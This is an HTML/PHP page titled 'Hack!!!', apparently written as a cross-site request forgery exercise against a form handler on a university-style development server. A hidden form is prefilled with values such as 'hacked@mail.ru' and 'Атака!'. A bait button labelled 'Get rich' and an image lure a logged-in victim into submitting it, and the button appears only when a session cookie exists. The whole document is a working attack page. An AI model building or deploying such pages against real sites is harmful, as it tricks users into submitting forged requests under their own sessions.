<!DOCTYPE html>
<html>
    <head>
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width">
        <title>Взлом!!!</title>
    </head>
    <body>
        <form method="post" action="http://u47541.kubsu-dev.ru/z7/index.php">
            <div class="form-group" style="display:none;">
                    <input type="text" name="name" value="взломан" checked>
                    <input type="text" name="email" value="hacked@mail.ru" checked>
                    <input type="date" id="date" name="date" value="11.10.2000" checked>
                    <input type="radio" id="male" value="male" name="pol" checked>
                    <input type="radio" name="konechn" value='4' checked>
                    <label><select name="super[]" multiple="multiple">
						<option value="bessmertie" checked>
					</label>
                    <textarea  name="info" value="Ataka" checked>Атака!</textarea>
                    <input type="checkbox" name="check1" value="check1" checked></p>
            </div>
            <?php if(!empty($_COOKIE[session_name()]) ) print('<p><button type="submit" >Разбогатеть</button></p>');?>
            <p><img src="https://akket.com/wp-content/uploads/2021/12/Eto-neizbezhno.-S-1-yanvarya-dengi-obestsenyatsya-9.jpg" width="500px" height="40%"></p>
        </form>
    </body>
</html>